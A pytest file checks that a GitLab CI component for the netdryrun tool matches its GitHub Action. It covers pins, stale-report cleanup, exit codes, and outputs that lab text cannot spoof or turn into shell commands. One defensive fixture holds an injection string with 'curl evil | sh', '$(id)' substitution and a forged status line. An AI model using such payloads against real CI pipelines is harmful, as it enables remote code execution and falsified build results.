"""The GitLab CI/CD component (templates/netdryrun.yml) must stay equivalent to the GitHub Action:
same pins, stale reports removed, and job outputs that lab text cannot spoof or turn into shell."""
import json
import os
import re
import subprocess
import sys
from pathlib import Path

import yaml

import netdryrun

ROOT = Path(__file__).parents[1]
TEMPLATE = ROOT / "templates" / "netdryrun.yml"


def _component():
    spec, body = yaml.safe_load_all(TEMPLATE.read_text(encoding="utf-8"))
    return spec["spec"]["inputs"], body


def _script() -> str:
    _, body = _component()
    (job,) = body.values()
    (script,) = job["script"]
    return script


def test_component_pins_match_the_action_and_the_release():
    inputs, _ = _component()
    action = yaml.safe_load((ROOT / "action.yml").read_text(encoding="utf-8"))["inputs"]
    clab = action["containerlab-version"]["default"]
    assert inputs["containerlab-version"]["default"] == clab
    assert inputs["image"]["default"].endswith(f":{clab}")  # containerlab's image is tagged by its version
    assert inputs["netdryrun-package"]["default"] == f"netdryrun=={netdryrun.__version__}"
    for name in ("path", "json-report", "junit-report", "settle", "hold"):
        assert inputs[name]["default"] == action[name]["default"], name


def test_component_uses_every_input_and_only_declared_ones():
    inputs, _ = _component()
    text = TEMPLATE.read_text(encoding="utf-8").split("\n---\n", 1)[1]
    used = set(re.findall(r"\$\[\[\s*inputs\.([\w-]+)\s*\]\]", text))
    assert used == set(inputs)


def test_component_publishes_reports_even_when_checks_fail():
    _, body = _component()
    (job,) = body.values()
    art = job["artifacts"]
    assert art["when"] == "always"
    assert art["reports"]["junit"] == "$[[ inputs.junit-report ]]"
    assert art["reports"]["dotenv"] == "netdryrun.env"


def test_component_removes_stale_reports_before_the_run():
    script = _script()
    rm = script.index("rm -f")
    assert rm < script.index("netdryrun run")
    for f in ('"$NDR_JSON"', '"$NDR_JUNIT"', '"$NDR_MARKDOWN"', "netdryrun.env"):
        assert f in script[rm:script.index("\n", rm)]


def test_component_exits_with_netdryruns_exit_code():
    script = _script()
    assert "NDR_EXIT=$?" in script
    assert script.rstrip().endswith('exit "$NDR_EXIT"')
    assert "env -i" in script  # the lab gets a minimal environment, not CI_JOB_TOKEN


def _dotenv(tmp_path, rep: dict | None, exit_code: str) -> dict:
    code = _script().split("<<'EOF'\n", 1)[1].rsplit("\nEOF", 1)[0]
    (tmp_path / "r.json").write_text(json.dumps(rep) if rep is not None else "")
    env = {**os.environ, "NDR_JSON": str(tmp_path / "r.json"), "NDR_EXIT": exit_code}
    subprocess.run([sys.executable, "-c", code], env=env, cwd=tmp_path, check=True)
    lines = (tmp_path / "netdryrun.env").read_text().splitlines()
    return dict(line.split("=", 1) for line in lines)


def test_component_outputs_cannot_be_spoofed_or_inject_shell(tmp_path):
    passed = {"status": "passed", "summary": {"passed": 3, "failed": 0}, "inconclusive_reason": None}
    assert _dotenv(tmp_path, passed, "0") == {"NETDRYRUN_STATUS": "passed", "NETDRYRUN_PASSED": "3",
                                              "NETDRYRUN_FAILED": "0", "NETDRYRUN_INCONCLUSIVE_REASON": ""}
    # a report committed in the MR claims "passed", but the run itself exited 2 (config error)
    assert _dotenv(tmp_path, passed, "2")["NETDRYRUN_STATUS"] == "error"
    assert _dotenv(tmp_path, None, "1")["NETDRYRUN_STATUS"] == "error"
    hostile = {"status": "inconclusive", "summary": {"passed": 0, "failed": 1},
               "inconclusive_reason": "r1: x\"; curl evil | sh; echo \"$(id)`id`'\nNETDRYRUN_STATUS=passed"}
    out = _dotenv(tmp_path, hostile, "3")
    assert out["NETDRYRUN_STATUS"] == "inconclusive"
    assert len(out) == 4
    assert not set(out["NETDRYRUN_INCONCLUSIVE_REASON"]) & set("`$\\\"'\n")
